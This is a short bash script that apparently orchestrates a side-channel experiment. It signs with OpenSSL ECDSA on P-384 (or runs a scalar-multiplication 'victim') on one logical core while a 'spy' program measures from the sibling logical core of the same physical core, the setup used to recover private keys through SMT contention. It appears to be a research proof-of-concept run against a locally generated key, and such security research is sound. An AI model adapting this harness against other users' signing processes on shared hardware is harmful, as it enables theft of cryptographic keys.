#!/bin/bash

OPENSSL=/usr/bin/openssl
KEY_CURVE=secp384r1
KEY_FILE=$KEY_CURVE.pem

gmake clean
gmake
pkill spy
rm -f pipe.fifo

# create a P-384 key pair if it does not exist
if [ ! -f $KEY_FILE ]; then
    $OPENSSL ecparam -genkey -name $KEY_CURVE -out $KEY_FILE
    $OPENSSL ec -in $KEY_FILE -pubout >> $KEY_FILE
fi

# create pipe
mkfifo pipe.fifo

# Victims: exactly one of these should active at runtime, so make sure exactly one is commented out.

# Victim 1: start signing but it will be blocked
cpuset -c -l 0 $OPENSSL dgst -sha512 -sign $KEY_FILE -out data.sig pipe.fifo &

# Victim 2: start scalar multiplication but it will be blocked
#cpuset -c -l 0 ./ecc M 4 000084210000842100008421000084210000842100008421000084210000842100008421000084210000842100008421 &

sleep 0.1

# Spy: must be on same physical core, but different logical core
# start spying and generate the message to be signed
cpuset -c -l 1 ./spy

# wait to finish the signature/spying
wait

# reproduce the message file (all zeroes)
dd if=/dev/zero of=data.bin bs=1 count=1K

# remove pipe
rm -f pipe.fifo

pkill spy

